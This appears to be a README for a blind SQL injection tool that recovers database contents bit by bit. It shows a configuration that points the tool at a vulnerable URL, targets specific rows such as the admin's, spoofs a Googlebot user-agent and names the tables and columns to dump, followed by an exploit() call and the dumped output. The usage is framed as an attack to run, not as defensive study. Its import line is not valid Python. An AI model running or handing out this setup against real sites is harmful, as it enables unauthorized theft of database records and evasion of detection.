# Blind SQL Injection via Bitshifting

This is a module that performs blind SQL injection by using the bitshifting method to **calculate** chars instead of guessing them. It requires exactly 8 requests per character.

Further efficiency is possible as specified in the original [paper](https://www.exploit-db.com/papers/17073/):

```
Further optimizing this technique can be done.
The ASCII table is just 127 characters which is 7 bits per character so we can assume we will never go over it and decrement this technique with 1 request per character.
```

This module does not make those assumptions, but can with some slight modifications. This is so that it can handle all scenarios, including edge cases.

## Usage
```
import blind-sql-bitshifting as x

# Edit this dictionary to configure attack vectors
x.options
```

### Example configuration:

```
# Vulnerable link
x.options["target"] = "http://www.example.com/index.php?id=1"

# Specify cookie (optional)
x.options["cookies"] = ""

# Specify a condition for a specific row, e.g. 'uid=1' for admin (optional)
x.options["row_condition"] = ""

# Boolean option for following redirections
x.options["follow_redirections"] = 0

# Specify user-agent
x.options["user_agent"] = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# Specify table to dump
x.options["table_name"] = "table"

# Specify columns to dump
x.options["columns"] = "col1,col2"

# String to check for on page after successful statement
x.options["truth_string"] = "<p id='header'>true</p>"
```

Then:

`x.exploit()`

This returns a 2-dimensional array, with each sub-array containing a single row, the first being the column headers.

Example output:

`[['id', 'username'], ['1', 'lol'], ['2', 'lel']]`

Optionally, your scripts can then harness the [tabulate](https://pypi.python.org/pypi/tabulate) module to output the data:

```
from tabulate import tabulate

data = x.exploit()

print tabulate(data,
               headers='firstrow',
               tablefmt='psql')
```

This would output:

```
+------+------------+
|   id | username   |
|------+------------|
|    1 | lol        |
|    2 | lel        |
+------+------------+
```
